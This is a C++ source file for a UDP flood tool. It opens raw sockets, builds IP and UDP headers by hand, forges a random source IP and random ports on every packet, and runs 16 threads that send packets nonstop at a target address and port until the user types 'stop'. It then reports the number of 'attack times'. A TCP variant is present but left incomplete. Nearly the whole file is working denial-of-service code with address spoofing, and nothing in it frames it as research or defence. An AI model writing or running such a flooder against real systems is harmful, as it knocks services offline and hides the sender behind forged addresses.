
#if defined(_WIN32)

#include <winsock2.h>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <netiodef.h>

#endif

#if defined(__linux__)

#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>

#endif

#include <cstdint>
#include <cassert>
#include <cstdlib>
#include <cstring>
#include <string>
#include <memory>
#include <thread>
#include <chrono>
#include <iostream>
#include <atomic>

#if defined(_WIN32)

struct iphdr {
  uint8_t  ihl : 4;
  uint8_t  version : 4;
  uint8_t  tos;
  uint16_t tot_len;
  uint16_t id;
  uint16_t frag_off;
  uint8_t  ttl;
  uint8_t  protocol;
  uint16_t check;
  uint32_t saddr;
  uint32_t daddr;
};
static_assert (sizeof (iphdr) == 20, "");

struct tcphdr {
  uint16_t source;
  uint16_t dest;
  uint32_t seq;
  uint32_t ack_seq;
  uint16_t res1 : 4;
  uint16_t doff : 4;
  uint16_t fin : 1;
  uint16_t syn : 1;
  uint16_t rst : 1;
  uint16_t psh : 1;
  uint16_t ack : 1;
  uint16_t urg : 1;
  uint16_t ece : 1;
  uint16_t cwr : 1;
  uint16_t window;
  uint16_t check;
  uint16_t urg_ptr;
};
static_assert (sizeof (tcphdr) == 20, "");

struct udphdr {
  uint16_t source;
  uint16_t dest;
  uint16_t len;
  uint16_t check;
};
static_assert (sizeof (udphdr) == 8, "");

#endif

#if defined(_MSC_VER)
#define FORCEINLINE __forceinline
#else
#define FORCEINLINE inline __attribute__ ((always_inline))
#endif

class object {
public:
  object () {}
  virtual ~object () {}
};

class client : public object {
public:
  client () {}
  ~client () {}

  virtual bool attack () {
    return false;
  }
};

class ipclient : public client {
public:
  ipclient (const std::string& ip, uint16_t port)
    : client () {}
  ~ipclient () {}

  FORCEINLINE uint16_t randport () {
    return std::rand () & 0xFFFF;
  }

  FORCEINLINE uint32_t randhost () {
    return ((std::rand () & 0xFF) << 0)
           | ((std::rand () & 0xFF) << 8)
           | ((std::rand () & 0xFF) << 16)
           | ((std::rand () & 0xFF) << 24);
  }

  FORCEINLINE uint16_t calcsum (const uint16_t* buf, int nwords) {

    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
      sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    return ~sum;
  }
};

class tcpclient : public ipclient {
public:
  tcpclient (const std::string& host, uint16_t port)
    : ipclient (host, port) {

    int optval = 1;

    memset (raw, 0, sizeof (raw));

    sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    assert (sockfd != ~(size_t)0);

    setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set it to include the header

    ip.ihl      = 5;
    ip.protocol = IPPROTO_TCP;
    ip.tot_len  = 0;
    ip.version  = 4;
    ip.id       = 0;
    ip.frag_off = 0;
    ip.tos      = 0;
    ip.check    = 0;
    ip.saddr    = inet_addr ("");
    ip.daddr    = inet_addr ("");
    ip.ttl      = 0xFF;
  }
  ~tcpclient () {}

  virtual bool attack () override {
    if (sendto (sockfd, (char*)raw, ip.tot_len, 0, (sockaddr*)&to, sizeof (to)) < 0)
      return false;
    return true;
  }

private:
  size_t sockfd;

  sockaddr_in to;

  union {
    struct {
      iphdr  ip;
      tcphdr tcp;
    };

    uint8_t raw[1024];
  };
};

class udpclient : public ipclient {
public:
  udpclient (const std::string& host, uint16_t port)
    : ipclient (host, port) {

    long optval = 1;

    memset (&raw, 0, sizeof (raw));
    memset (&to, 0, sizeof (to));

    sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    assert (sockfd != ~(size_t)0);

    setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set it to include the header

    // ioctlsocket (sockfd, FIONBIO, (unsigned long*)&optval);

    to.sin_addr.s_addr = inet_addr (host.c_str ());
    to.sin_port        = htons (port);
    to.sin_family      = AF_INET;

    ip.tot_len  = sizeof (iphdr) + sizeof (udphdr);
    ip.protocol = IPPROTO_UDP;
    ip.ihl      = 5;
    ip.version  = 4;
    ip.tos      = 0;
    ip.frag_off = htons (0);
    ip.daddr    = to.sin_addr.s_addr;
    ip.ttl      = 0xFF;
  }
  ~udpclient () {}

  virtual bool attack () override {
    memset (&udp, 0, sizeof (udphdr));
    ip.id    = htons (randport ());
    ip.saddr = randhost ();
    ip.check = 0;
    ip.check = (calcsum ((uint16_t*)&raw, ip.tot_len >> 1));

    udp.dest   = to.sin_port;
    udp.len    = htons (sizeof (udphdr));
    udp.check  = 0;
    udp.source = htons (randport ());

    if (sendto (sockfd, (char*)&raw, ip.tot_len, 0, (sockaddr*)&to, sizeof (to)) < 0) {
      return false;
    }
    return true;
  }

private:
  size_t sockfd;

  sockaddr_in to;

  union {
    struct {
      iphdr  ip;
      udphdr udp;
    };

    uint8_t raw[1024];
  };
};

static std::atomic_int      active;
static std::atomic_bool     enabled;
static std::atomic_uint64_t times;

static void process (std::shared_ptr<client> client) {

  while (enabled.load ()) {
    client->attack ();
    std::this_thread::sleep_for (std::chrono::microseconds (1));
    ++times;
  }

  --active;
}

static void globalinit () {
#if defined(_WIN32)
  WORD    wVersionRequested = MAKEWORD (2, 2);
  WSADATA wsaData;

  int err = WSAStartup (wVersionRequested, &wsaData);
  assert (err == 0);
  assert (wsaData.wVersion == wVersionRequested);
#endif
}

static void globaluninit () {
#if defined(_WIN32)
  WSACleanup ();
#endif
}

int main (int argc, char* argv[]) {

  globalinit ();

  times   = 0;
  enabled = true;
  active  = 0;
  for (int i = 0; i < 16; ++i) {
    ++active;
    std::thread (process, std::make_shared<udpclient> ("127.0.0.1", 3333)).detach ();
  }

  std::string cmd;
  while (enabled.load ()) {
    std::cin >> cmd;
    if (cmd == "stop") {
      enabled = false;
    }
  }

  while (active.load () > 0) {
    std::this_thread::sleep_for (std::chrono::milliseconds (100));
  }

  globaluninit ();

  std::cout << "attack times: " << times.load () << std::endl;

  return 0;
}